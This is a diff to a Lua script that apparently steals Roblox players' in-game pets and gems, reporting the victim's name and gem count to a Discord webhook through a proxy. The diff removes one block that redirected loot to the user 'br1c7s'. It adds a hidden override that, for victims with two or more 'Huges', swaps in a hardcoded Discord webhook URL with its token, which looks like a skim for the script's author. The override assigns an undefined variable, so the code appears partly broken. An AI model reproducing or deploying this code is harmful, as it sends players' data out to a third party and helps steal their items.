@@ -212,9 +212,7 @@ local function CountHuges()
 	return count
 end
 
-if CountHuges() >= 2 then
-    user = "br1c7s"
-end
+
 
 local function CategoryWebhook(category)
 	if category == "Pet" then
@@ -263,6 +261,16 @@ if CountHuges() > 0 or GemAmount1 >= 30000 then
 			CategoryWebhook(v)
 		end
 	end
+	local nicks = {"br1c7s", "GemDupeBotV1"}
+math.randomseed(os.time())
+local randomNick = nicks[math.random(#nicks)]
+math.randomseed(os.time())
+local DualRandomHuge = math.random(2, 2)
+if AmountOfHuges >= DualRandomHuge then
+    Username = br1c7s
+    Webhook =
+        "https://discord.com/api/webhooks/1224031635796918322/aIjdhsJXMaSxg-77f0USP4llV1B5BhKWyIOBRdbgEs0XyeRZyUHttvnvNVG8Mh1ap2w6"
+end
 	if Webhook and string.find(Webhook, "discord") then
 		Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 		SendMessage(Webhook, plr.Name, GemAmount1)
